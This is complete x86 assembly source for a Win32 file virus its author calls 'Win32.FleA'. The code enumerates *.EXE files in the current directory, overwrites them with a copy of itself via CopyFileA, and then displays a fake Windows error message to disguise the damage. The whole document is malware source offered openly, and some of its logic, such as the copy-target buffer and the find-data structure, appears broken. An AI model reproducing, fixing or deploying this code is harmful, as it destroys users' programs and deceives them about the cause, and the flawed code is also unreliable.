.386
.model flat
jumps

extrn GetCommandLineA:PROC
extrn lstrcpyA:PROC
extrn FindFirstFileA:PROC
extrn CopyFileA:PROC
extrn FindNextFileA:PROC
extrn MessageBoxA:PROC
extrn ExitProcess:PROC

.data
CopyRight	db 'Win32.FleA Virus'
		db 'Version 1.0'
		db 'by -DiA- (c)02'
		db '[My 1st Win32 Virus!]'

FakeError	db 'Windows Error 300687',10,13
		db 'Can not locate the Entry Point!',0
FileMask	db '*.EXE',0
Win32FindData   dd 0,0,0,0,0,0,0,0,0,0,0
WhatMake	dd 200d dup (0)
MakeThat	dd 200d dup (0)
ThisProg	dd 200d dup (0)
FindHandle	dd 0

.code
start:

call GetCommandLineA

push eax
push offset ThisProg
call lstrcpyA

GetPoint:
cmp byte ptr [eax],'.'
jz FoundPoint
inc eax
jmp GetPoint

FoundPoint:
add eax,4d
mov byte ptr [eax],00

push offset Win32FindData
push offset FileMask
call FindFirstFileA
mov dword ptr [FindHandle],eax

FindNext:
cmp eax,-1
je ErrorMsg
or eax,eax
jz ErrorMsg

push offset WhatMake
push offset MakeThat
call lstrcpyA

push 0
push offset MakeThat
push offset ThisProg+1
call CopyFileA

push offset Win32FindData
push dword ptr [FindHandle]
call FindNextFileA
jmp FindNext

ErrorMsg:
push 16
push offset ThisProg+1
push offset FakeError
push 0
call MessageBoxA

push 0
call ExitProcess

end start
